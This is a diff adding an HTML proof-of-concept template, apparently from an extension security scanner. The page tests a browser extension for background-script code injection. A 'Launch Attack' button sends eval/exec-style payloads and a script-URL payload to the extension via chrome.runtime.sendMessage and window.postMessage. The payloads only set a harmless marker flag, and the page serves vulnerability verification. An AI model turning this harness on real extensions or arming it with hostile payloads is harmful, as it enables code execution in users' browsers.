@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC — Background Injection — {{ ext_id }}</title>
+<style>
+  body { font-family: monospace; max-width: 800px; margin: 40px auto;
+         background: #1a1a1a; color: #e0e0e0; padding: 20px; }
+  h2 { color: #ff6b6b; }
+  .meta { background: #2a2a2a; border-left: 3px solid #444;
+          padding: 12px; margin: 16px 0; }
+  pre { background: #0d0d0d; padding: 16px; overflow-x: auto;
+        border: 1px solid #333; border-radius: 4px; }
+  button { background: #ff6b6b; color: #fff; border: none;
+           padding: 10px 24px; cursor: pointer; font-size: 14px;
+           border-radius: 4px; margin-top: 16px; }
+  button:hover { background: #ff4444; }
+  #result { margin-top: 16px; background: #0d0d0d; padding: 16px;
+            border: 1px solid #333; border-radius: 4px;
+            min-height: 60px; white-space: pre-wrap; }
+  .tag { display: inline-block; padding: 2px 8px; border-radius: 3px;
+         font-size: 12px; background: #ff6b6b; color: #fff; }
+</style>
+</head>
+<body>
+<h2>PoC: Background Injection</h2>
+<div class="meta">
+  <div><strong>Extension ID:</strong> <code>{{ ext_id }}</code></div>
+  <div><strong>Finding:</strong> {{ finding.title }}</div>
+  <div><strong>Severity:</strong>
+    <span class="tag">{{ finding.severity | upper }}</span></div>
+  <div><strong>Confidence:</strong>
+    {{ (finding.confidence * 100) | int }}%</div>
+  <div><strong>Generated:</strong> {{ generated_at }}</div>
+</div>
+
+<h3>Payloads</h3>
+<pre>{{ finding.evidence | e }}</pre>
+
+<button id="launch">Launch Attack</button>
+<div id="result">Click Launch Attack to send payloads...</div>
+
+<script>
+const EXT_ID = "{{ ext_id }}";
+const PAYLOADS = [
+  { code: "self.__poc_injected = true" },
+  { type: "exec", code: "self.__poc_injected = true" },
+  { action: "eval", script: "self.__poc_injected = true" },
+  { scriptUrl: location.origin + "/canary.js" }
+];
+
+document.getElementById('launch').onclick = function() {
+  var result = document.getElementById('result');
+  result.textContent = 'Sending ' + PAYLOADS.length + ' payloads...\n';
+
+  PAYLOADS.forEach(function(payload, i) {
+    setTimeout(function() {
+      if (typeof chrome !== 'undefined' && chrome.runtime) {
+        chrome.runtime.sendMessage(EXT_ID, payload, function(resp) {
+          if (chrome.runtime.lastError) return;
+          result.textContent +=
+            'Payload ' + (i+1) + ' response: ' +
+            JSON.stringify(resp) + '\n';
+        });
+      }
+      window.postMessage(payload, '*');
+    }, i * 300);
+  });
+};
+</script>
+</body>
+</html>
+
